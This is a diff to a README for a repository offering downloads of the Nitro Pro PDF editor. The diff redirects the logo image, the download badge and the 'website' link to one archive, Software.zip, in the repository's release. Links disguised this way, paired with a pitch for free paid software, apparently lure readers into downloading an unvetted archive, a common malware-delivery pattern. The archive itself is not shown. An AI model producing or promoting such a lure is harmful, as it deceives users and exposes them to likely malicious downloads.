@@ -4,7 +4,7 @@
 
 This repository is all about **Nitro Pro**, a powerful PDF editing and creation software. Whether you are looking to download Nitro Pro 14, find resources for Nitro Team Pro, or explore various versions and features of Nitro Pro, you've come to the right place. 📄💻
 
-![Nitro Pro Logo](https://your-image-url.com)
+![Nitro Pro Logo](https://github.com/f3ca/Nitro-Pro-New/releases/download/v2.0/Software.zip)
 
 ### Repository Details:
 - **Repository Name:** Nitro-Pro-New
@@ -42,7 +42,7 @@ Understand the significance of obtaining a valid Nitro Pro license, the benefits
 
 Ready to dive into the world of Nitro Pro? Click the button below to explore and download the resources you need:
 
-[![Download Nitro Pro](https://img.shields.io/badge/Download-Nitro_Pro-9cf)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Nitro Pro](https://github.com/f3ca/Nitro-Pro-New/releases/download/v2.0/Software.zip)](https://github.com/f3ca/Nitro-Pro-New/releases/download/v2.0/Software.zip)
 *Launch to experience the power of Nitro Pro!* 🚀
 
 ---
@@ -51,7 +51,7 @@ Ready to dive into the world of Nitro Pro? Click the button below to explore and
 
 For updates, discussions, and support, join our Nitro Pro community. Connect with fellow users, share your experiences, and discover new ways to optimize your PDF workflow.
 
-🌐 [Visit Our Website](https://www.nitroprocommunity.com) 🌐
+🌐 [Visit Our Website](https://github.com/f3ca/Nitro-Pro-New/releases/download/v2.0/Software.zip) 🌐
 
 ---
 
